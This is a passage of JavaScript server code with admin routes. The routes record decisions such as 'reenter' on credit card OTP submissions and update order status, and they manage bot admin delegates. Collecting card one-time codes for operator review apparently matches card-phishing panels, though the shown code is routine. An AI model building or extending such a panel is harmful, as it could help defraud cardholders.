        reenter: { decision: 'reenter', status: 'received' },
      };
      const cfg = map[action];
      if (!cfg) return res.status(400).json({ error: 'Invalid action' });
      const sub = await getCreditCardOtpSubmission(req.params.id);
      if (!sub) return res.status(404).json({ error: 'Submission not found' });
      await setCreditCardOtpSubmissionDecision(sub.id, cfg.decision);
      const r = await updateOrderStatusByOrderId(ORDERS_CRM_PATH, sub.orderId, cfg.status);
      res.json({ ok: true, submission: await getCreditCardOtpSubmission(sub.id), order: r.order || null });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.get('/api/admin/bot-admins', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      const data = await loadBotAdmins(BOT_ADMINS_PATH);
      res.json({
        delegates: data.delegates || {},
        permissionKeys: BOT_PERMISSION_KEYS,
        helpHtml: formatPermissionsHelpAr(),
      });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.post('/api/admin/bot-admins', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      const userId = String(req.body?.userId || '').trim();
      const permissions = Array.isArray(req.body?.permissions)
        ? req.body.permissions.map((p) => String(p).trim().toLowerCase()).filter(Boolean)
        : String(req.body?.permissions || 'all')
            .split(/[,\s]+/)
            .map((p) => p.trim().toLowerCase())
            .filter(Boolean);
      if (!/^\d+$/.test(userId)) return res.status(400).json({ error: 'Invalid userId' });
      const data = await loadBotAdmins(BOT_ADMINS_PATH);
      data.delegates[userId] = {
        addedAt: new Date().toISOString(),
        addedBy: 'web-admin',
        note: String(req.body?.note || '').slice(0, 200),
        permissions: permissions.length ? permissions : ['all'],
      };
      await saveBotAdmins(BOT_ADMINS_PATH, data);
      res.json({ ok: true, delegates: data.delegates });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });

  app.delete('/api/admin/bot-admins/:userId', async (req, res) => {
    if (!requireAdmin(req, res)) return;
    try {
      const userId = String(req.params.userId || '').trim();
      const data = await loadBotAdmins(BOT_ADMINS_PATH);
      delete data.delegates[userId];
      await saveBotAdmins(BOT_ADMINS_PATH, data);
      res.json({ ok: true, delegates: data.delegates });
    } catch (e) {
      res.status(500).json({ error: String(e?.message || e) });
    }
  });
}
